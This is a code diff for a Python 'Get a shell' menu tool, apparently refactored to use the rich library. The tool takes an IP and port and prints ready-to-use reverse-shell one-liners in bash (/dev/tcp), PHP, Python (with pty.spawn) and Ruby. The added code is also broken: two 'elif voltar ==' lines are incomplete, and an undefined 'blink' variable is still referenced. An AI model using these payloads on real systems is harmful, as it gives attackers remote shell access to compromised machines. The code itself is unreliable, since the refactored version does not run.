@@ -2,27 +2,21 @@ from time import sleep
 import sys
 import os
 
-#color
-red = "\033[91;1m"
-reset = "\033[0m"
-green = "\033[92;1m"
-cyan = "\033[96;1m"
-yellow = "\033[93;1m"
-magenta = "\033[95;1m"
-blue = "\033[94;1m"
-white = "\033[97;1m"
-blink = "\033[5m"
-#end
-os.system(['clear', 'cls'][os.name == 'nt'])
+from rich import print
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
 def tittle():
-    print(red + """
+    print("""[red]
 ╔═╗┌─┐┌┬┐  ┌─┐  ┌─┐┬ ┬┌─┐┬  ┬  
 ║ ╦├┤  │   ├─┤  └─┐├─┤├┤ │  │  
 ╚═╝└─┘ ┴   ┴ ┴  └─┘┴ ┴└─┘┴─┘┴─┘                                                
     """)
 
 def main_menu():
-    print(red  + """
+    print("""[red]
                             _______________                               
                         ,==='.,            `-._                           
                             `.`---.__         `-._                       
@@ -39,167 +33,115 @@ Chosse your shell type         :.     `--.         `.
                             `.___,'   `.__,'   `.__,'  get a shell
     
     """)
-    question = input(cyan + """Enter an option
+    question = input("""[cyan]Enter an option
     ⤷ """)
     if question == "666":
         print(blink + "Thank you for using the script!")
-        sleep(3)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         exit()
     elif question == "1":
-         os.system(['clear', 'cls'][os.name == 'nt'])
+         clear()
          bash()
     elif question == "2":
-         os.system(['clear', 'cls'][os.name == 'nt'])
+         clear()
          php()
     elif question == "3":
-         os.system(['clear', 'cls'][os.name == 'nt'])
+         clear()
          python()
     elif question == "4":
-         os.system(['clear', 'cls'][os.name == 'nt'])
+         clear()
          ruby()
 
-# shells aqui >,
-
 def bash():
-    os.system(['clear', 'cls'][os.name == 'nt'])
     tittle()
-    print("")
-    ip = input(green  + "Enter your IP ►  ")
-    print("")
-    port = input(green  + "Enter the port ►  ")
-    print("")
-    print("")
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
+    ip = input("\n[green]Enter your IP ►  ")
+    port = input("[green]Enter the port ►  ")
+
+    print("\n[yellow]Making your shell...\n")
+
     bash = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
-    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{bash}{blue}{reset}")
-    print("")
-    print("")
-    sleep(6)
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
+    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{bash}[/]\n")
+
+    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")
+
     if voltar == "yes":
         sleep(1)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         main_menu()
+
     elif voltar == "no":
-        print(magenta + " ⤷ Thank you for using the script! ")
-        sleep(2)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         exit()
 
 def php():
-    os.system(['clear', 'cls'][os.name == 'nt'])
+    clear()
     tittle()
-    print("")
-    ip = input(green  + "Enter your IP ►  ")
-    print("")
-    port = input(green  + "Enter the port ►  ")
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
+
+    ip = input("[green]Enter your IP ►  ")
+    port = input("[green]Enter the port ►  ")
+
+    print("\n[yellow]Making your shell... ")
+
     php = shell = "php -r '$sock=fsockopen(\"{}\", {});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port)
-    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{php}{blue}{reset}")
-    print("")
-    sleep(6)
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
+    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{php}[/]")
+
+    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")
+
     if voltar == "yes":
         sleep(1)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         main_menu()
+
     elif voltar == "no":
-        print(magenta + " ⤷ Thank you for using the script! ")
-        sleep(2)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         exit()
 
 def python():
-    os.system(['clear', 'cls'][os.name == 'nt'])
+    clear()
     tittle()
-    print("")
-    ip = input(green  + "Enter your IP ►  ")
-    print("")
-    port = input(green  + "Enter the port ►  ")
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
+
+    ip = input("\n[green]Enter your IP ►  ")
+    port = input("[green]Enter the port ►  ")
+
+    print("\n[yellow]Making your shell... [/]")
+
     python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\", {}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'".format(ip, port)
-    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{python}{blue}{reset}")
-    print("")
-    sleep(6)
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
+    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{python}[/]")
+
+    voltar = input("[red]Do you want to return to the main menu? (yes/no) ► ")
+
     if voltar == "yes":
         sleep(1)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         main_menu()
-    elif voltar == "no":
-        print(magenta + " ⤷ Thank you for using the script! ")
+
+    elif voltar ==
         sleep(2)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         exit()
 
 
 def ruby():
-    os.system(['clear', 'cls'][os.name == 'nt'])
+    clear()
     tittle()
-    print("")
-    ip = input(green  + "Enter your IP ►  ")
-    print("")
-    port = input(green  + "Enter the port ►  ")
-    print("")
-    print("")
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    print("")
-    print("")
-    print(yellow + "Making your shell... ")
-    sleep(2)
-    print("")
+
+    ip = input("[green]Enter your IP ►  ")
+    port = input("[green]Enter the port ►  ")
+
+    print("\n[yellow]Making your shell... ")
+
     ruby  = "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port)
-    print(f"{red}here is it{red} {yellow}➜{yellow}  {blue}{ruby}{blue}{reset}")
-    print("")
-    print("")
-    sleep(6)
-    os.system(['clear', 'cls'][os.name == 'nt'])
-    tittle()
-    voltar = input(red + "Do you want to return to the main menu? (yes/no) ► ")
+    print(f"[red]Here is it[/] [yellow]➜[/]  [blue]{ruby}[/blue]")
+
+    voltar = input("[red] Do you want to return to the main menu? (yes/no) ► ")
+
     if voltar == "yes":
         sleep(1)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+        clear()
         main_menu()
-    elif voltar == "no":
-        print(magenta + " ⤷ Thank you for using the script! ")
-        sleep(2)
-        os.system(['clear', 'cls'][os.name == 'nt'])
+
+    elif voltar ==
+        clear()
         exit()
 
 
@@ -208,4 +150,3 @@ bash()
 php()
 python()
 ruby()
-
